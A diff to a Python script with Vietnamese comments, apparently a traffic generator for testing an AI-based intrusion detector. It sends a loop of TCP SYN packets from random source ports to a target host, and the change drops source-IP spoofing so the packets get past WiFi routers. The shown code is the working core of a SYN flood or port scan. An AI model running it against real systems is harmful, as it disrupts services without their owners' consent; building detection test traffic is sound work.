@@ -17,9 +17,10 @@ for i in range(200):
     fake_port = random.randint(1024, 65535)
     
     # [ĐÃ ĐIỀU CHỈNH ĐỂ CHẠY QUA WIFI THỰC TẾ]
-    # Không dùng Layer 2 (Ether) vì nhiều Router Wifi sẽ chặn địa chỉ MAC giả.
-    # Dùng Layer 3 (IP/TCP) để hệ điều hành tự lo việc định tuyến MAC hợp lệ.
-    packet = IP(src=fake_ip, dst=TARGET_IP) / TCP(sport=fake_port, dport=TARGET_PORT, flags="S")
+    # Bỏ src=fake_ip để dùng IP thật của máy bắn (Router sẽ không chặn nữa)
+    # Tuy dùng IP thật nhưng chúng ta liên tục thay đổi Cổng nguồn (fake_port)
+    # Hệ thống AI vẫn sẽ nhận diện đây là hành vi quét cổng / SYN Flood!
+    packet = IP(dst=TARGET_IP) / TCP(sport=fake_port, dport=TARGET_PORT, flags="S")
     
     # Bắn gói tin ở Tầng 3 (Network Layer)
     send(packet, verbose=False)
